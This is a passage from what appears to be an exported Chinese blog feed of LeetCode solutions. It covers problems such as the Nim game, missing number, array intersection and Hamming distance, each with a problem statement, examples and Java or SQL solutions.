    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>你和你的朋友，两个人一起玩 Nim游戏：桌子上有一堆石头，每次你们轮流拿掉 1 - 3 块石头。 拿掉最后一块石头的人就是获胜者。你作为先手。</p>
<p>你们是聪明人，每一步都是最优解。 编写一个函数，来判断你是否可以在给定石头数量的情况下赢得游戏。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 4</span><br><span class="line">输出: false </span><br><span class="line">解释: 如果堆中有 4 块石头，那么你永远不会赢得比赛；</span><br><span class="line">     因为无论你拿走 1 块、2 块 还是 3 块石头，最后一块石头总是会被你的朋友拿走。</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>如果整数能被4整除，则无法胜利</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public boolean canWinNim(int n) &#123;</span><br><span class="line">        return n % 4 !&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>268. 缺失数字</title>
    <url>/2018/08/29/LeetCode/leetcode-000268.%20%E7%BC%BA%E5%A4%B1%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个包含 <code>0, 1, 2, ..., n</code> 中 n 个数的序列，找出 0 .. n 中没有出现在序列中的那个数。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [3,0,1]</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [9,6,4,2,3,5,7,0,1]</span><br><span class="line">输出: 8</span><br></pre></td></tr></table></figure>
<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><p>你的算法应具有线性时间复杂度。你能否仅使用额外常数空间来实现?</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>一个0-n的n个数列，每个数字只出现一个，只缺失了一个数字。用0-n这n+1和数字的和减去0-n这n个数字的和，差就是缺失的数字了。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = Arrays.stream(nums).sum();</span><br><span class="line">        <span class="keyword">int</span> ssum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= nums.length;i++) &#123;</span><br><span class="line">        	ssum += i;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ssum - sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：使用额外数组（不符合题目要求）"><a href="#解法二：使用额外数组（不符合题目要求）" class="headerlink" title="解法二：使用额外数组（不符合题目要求）"></a>解法二：使用额外数组（不符合题目要求）</h3><p>使用一个长为n+1的数组，如果某个位置上的数字出现了，则该位置对应的值置为1。最后遍历该数字，找到为0的位置，就是缺失的数字。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span>[] numss = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length + <span class="number">1</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			numss[nums[i]] = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; numss.length;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (numss[i] == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：排序"><a href="#解法三：排序" class="headerlink" title="解法三：排序"></a>解法三：排序</h3><p>对原数组进行排序，然后扫描该数组，得到缺失的值即可。</p>
<p>这里需要对首尾两处的值做特殊处理</p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		Arrays.sort(nums);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 判断 n 是否出现在末位</span></span><br><span class="line">        <span class="keyword">if</span> (nums[nums.length - <span class="number">1</span>] != nums.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums.length;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[<span class="number">0</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 判断 0 是否出现在首位</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (i != nums[i]) &#123;</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四：使用HashSet"><a href="#解法四：使用HashSet" class="headerlink" title="解法四：使用HashSet"></a>解法四：使用HashSet</h3><h4 id="Java-3"><a href="#Java-3" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Set&lt;Integer&gt; numSet = <span class="keyword">new</span> HashSet&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) numSet.add(num);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> expectedNumCount = nums.length + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> number = <span class="number">0</span>; number &lt; expectedNumCount; number++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!numSet.contains(number)) &#123;</span><br><span class="line">                <span class="keyword">return</span> number;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法五：异或位运算"><a href="#解法五：异或位运算" class="headerlink" title="解法五：异或位运算"></a>解法五：异或位运算</h3><p>数组是从0到n中有一个缺失，那么根据异或的特性，在遍历这个数据的时候，同时异或index和nums[index]的话，那些出现两次的数字就会消失，最后只剩下出现一次的缺失数字。</p>
<h4 id="Java-4"><a href="#Java-4" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    	<span class="comment">// 初始化为n，因为循环中i无法到达n，只能到达n-1</span></span><br><span class="line">		<span class="keyword">int</span> result = nums.length;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			result ^= i ^ nums[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>258. 各位相加</title>
    <url>/2018/08/29/LeetCode/leetcode-000258.%20%E5%90%84%E4%BD%8D%E7%9B%B8%E5%8A%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非负整数 <code>num</code>，反复将各个位上的数字相加，直到结果为一位数。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 38</span><br><span class="line">输出: 2 </span><br><span class="line">解释: 各位相加的过程为：3 + 8 &#x3D; 11, 1 + 1 &#x3D; 2。 由于 2 是一位数，所以返回 2。</span><br></pre></td></tr></table></figure>
<h2 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h2><p>你可以不使用循环或者递归，且在 O(1) 时间复杂度内解决这个问题吗？</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>参考的是：<a href="https://my.oschina.net/Tsybius2014/blog/497645" target="_blank" rel="noopener">https://my.oschina.net/Tsybius2014/blog/497645</a></p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">addDigits</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + ((num - <span class="number">1</span>) % <span class="number">9</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>182. 查找重复的电子邮箱</title>
    <url>/2018/08/29/LeetCode/leetcode-000182.%20%E6%9F%A5%E6%89%BE%E9%87%8D%E5%A4%8D%E7%9A%84%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个 SQL 查询，查找 <code>Person</code> 表中所有重复的电子邮箱。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+---------+</span><br><span class="line">| Id | Email   |</span><br><span class="line">+----+---------+</span><br><span class="line">| 1  | a@b.com |</span><br><span class="line">| 2  | c@d.com |</span><br><span class="line">| 3  | a@b.com |</span><br><span class="line">+----+---------+</span><br></pre></td></tr></table></figure>
<p>根据以上输入，你的查询应返回以下结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+</span><br><span class="line">| Email   |</span><br><span class="line">+---------+</span><br><span class="line">| a@b.com |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure>
<h2 id="说明：所有电子邮箱都是小写字母。"><a href="#说明：所有电子邮箱都是小写字母。" class="headerlink" title="说明：所有电子邮箱都是小写字母。"></a>说明：所有电子邮箱都是小写字母。</h2><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span>(email) <span class="keyword">as</span> Email <span class="keyword">from</span> person  <span class="keyword">group</span> <span class="keyword">by</span> email <span class="keyword">having</span>(<span class="keyword">count</span>(*) &gt; <span class="number">1</span>) ;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>349. 两个数组的交集</title>
    <url>/2018/08/29/LeetCode/leetcode-000349.%20%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个数组，编写一个函数来计算它们的交集。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums1 &#x3D; [1,2,2,1], nums2 &#x3D; [2,2]</span><br><span class="line">输出: [2]</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums1 &#x3D; [4,9,5], nums2 &#x3D; [9,4,9,8,4]</span><br><span class="line">输出: [9,4]</span><br></pre></td></tr></table></figure>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h2><ul>
<li>输出结果中的每个元素一定是唯一的。</li>
<li>我们可以不考虑输出结果的顺序。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：使用一个HashSet"><a href="#解法一：使用一个HashSet" class="headerlink" title="解法一：使用一个HashSet"></a>解法一：使用一个HashSet</h3><p>数组中元素不是唯一的，因此，两个数组的交集可能存在不唯一的数字，因此，使用了一个HashSet来去重。<br>整体思路是将两个数组排序，从第一个开始对比，如果相等，则同时进1，如果A[indexA] &gt; B[indexB]，则B索引进1,否则A索引进1。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] intersection(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2) &#123;</span><br><span class="line">		Arrays.sort(nums1);</span><br><span class="line">		Arrays.sort(nums2);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> length1 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> length2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		HashSet&lt;Integer&gt; result = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">while</span> (length1 &lt; nums1.length &amp;&amp; length2 &lt; nums2.length) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums1[length1] == nums2[length2]) &#123;</span><br><span class="line">				result.add(nums1[length1]);</span><br><span class="line">				length1++;</span><br><span class="line">				length2++;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums1[length1] &lt; nums2[length2]) &#123;</span><br><span class="line">				length1++;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				length2++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> array[] = <span class="keyword">new</span> <span class="keyword">int</span>[result.size()];</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> value : result) &#123;</span><br><span class="line">			array[i] = value;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：使用两个HashSet"><a href="#解法二：使用两个HashSet" class="headerlink" title="解法二：使用两个HashSet"></a>解法二：使用两个HashSet</h3><p>将nums1和nums2的数据都保存到set1和set2中，然后利用HashSet的retainAll方法，求它们的交集，输出即可。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] intersection(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2) &#123;</span><br><span class="line">		HashSet&lt;Integer&gt; set1 = <span class="keyword">new</span> HashSet&lt;&gt;(nums1.length);</span><br><span class="line">		HashSet&lt;Integer&gt; set2 = <span class="keyword">new</span> HashSet&lt;&gt;(nums2.length);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums1) &#123;</span><br><span class="line">			set1.add(num);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums2) &#123;</span><br><span class="line">			set2.add(num);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		set1.retainAll(set2);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> set1.stream().mapToInt(a -&gt; a).toArray();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>对nums1进行排序，然后遍历nums2，对每个在nums2中的数字，在nums1中二分查找，存在就保存到set中。</p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] intersection(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2) &#123;</span><br><span class="line">		HashSet&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		Arrays.sort(nums1);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums2) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="number">0</span> &lt;= Arrays.binarySearch(nums1, num)) &#123;</span><br><span class="line">				set.add(num);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> set.stream().mapToInt(a -&gt; a).toArray();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>389. 找不同</title>
    <url>/2018/08/29/LeetCode/leetcode-000389.%20%E6%89%BE%E4%B8%8D%E5%90%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个字符串 <code>s</code> 和 <code>t</code>，它们只包含小写字母。</p>
<p>字符串 <code>t</code> 由字符串 <code>s</code> 随机重排，然后在随机位置添加一个字母。</p>
<p>请找出在 <code>t</code> 中被添加的字母。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">s &#x3D; &quot;abcd&quot;</span><br><span class="line">t &#x3D; &quot;abcde&quot;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">e</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">&#39;e&#39; 是那个被添加的字母。</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>这道题目可以转化为一个列表，其中有一个字符只出现了一次，其余的字符均出现两次的问题。将字符转换为char，使用异或即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">findTheDifference</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">char</span> tmp = <span class="number">0x00</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">        	tmp =(<span class="keyword">char</span>)(tmp ^ s.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; t.length();i++) &#123;</span><br><span class="line">            tmp = (<span class="keyword">char</span>)(tmp ^ t.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>371. 两整数之和</title>
    <url>/2018/08/29/LeetCode/leetcode-000371.%20%E4%B8%A4%E6%95%B4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>不使用运算符 <code>+</code> 和<code>-</code>，计算两整数<code>a</code> 、<code>b</code>之和。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><p>若 a = 1 ，b = 2，返回 3。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用位运算</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span>(a == <span class="number">0</span>) &#123;</span><br><span class="line">    		<span class="keyword">return</span> b;</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span>(b == <span class="number">0</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> a;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> x = a ^ b;</span><br><span class="line">        <span class="keyword">int</span> y = (a &amp; b) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> getSum(x, y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>461. 汉明距离</title>
    <url>/2018/08/29/LeetCode/leetcode-000461.%20%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>两个整数之间的汉明距离指的是这两个数字对应二进制位不同的位置的数目。</p>
<p>给出两个整数 <code>x</code> 和 <code>y</code>，计算它们之间的汉明距离。</p>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>0 ≤ <code>x</code>, <code>y</code> &lt; 2^31.</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: x &#x3D; 1, y &#x3D; 4</span><br><span class="line"></span><br><span class="line">输出: 2</span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">1   (0 0 0 1)</span><br><span class="line">4   (0 1 0 0)</span><br><span class="line">       ↑   ↑</span><br><span class="line"></span><br><span class="line">上面的箭头指出了对应二进制位不同的位置。</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>现将两个整数转换为二进制字符串，然后填充0至一样的长度，按照位计算不同的个数即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        String sx = fillWithZero(Integer.toBinaryString(x));</span><br><span class="line">		String sy = fillWithZero(Integer.toBinaryString(y));</span><br><span class="line">        <span class="keyword">return</span> calDiff(sx, sy);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">fillWithZero</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (s.length() &lt; <span class="number">32</span>) &#123;</span><br><span class="line">			s = <span class="string">'0'</span> + s;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">calDiff</span><span class="params">(String x, String y)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; x.length();i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (x.charAt(i) != y.charAt(i)) &#123;</span><br><span class="line">				sum++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：异或位运算-Java内置函数"><a href="#解法二：异或位运算-Java内置函数" class="headerlink" title="解法二：异或位运算-Java内置函数"></a>解法二：异或位运算-Java内置函数</h3><p>异或运算的特性，如果两个bit同为1，或者同为0，那么它们异或的结果就是0，否则就是1.</p>
<p>因此，可以将两个数做异或运算，然后求出这个结果的二进制里面总共有多少个1就可以了。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> xor = x ^ y;</span><br><span class="line">		<span class="keyword">return</span> Integer.bitCount(xor);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：异或位运算-位运算求1的个数"><a href="#解法三：异或位运算-位运算求1的个数" class="headerlink" title="解法三：异或位运算-位运算求1的个数"></a>解法三：异或位运算-位运算求1的个数</h3><p>采用布赖恩·克尼根位计数算法的基本思想。该算法使用特定比特位和算术运算移除等于 1 的最右比特位。</p>
<p>当我们在 <code>number</code> 和 <code>number-1</code> 上做 AND 位运算时，原数字 <code>number</code> 的最右边等于 1 的比特会被移除。</p>
<p><img src="https://pic.leetcode-cn.com/Figures/461/461_brian.png" alt></p>
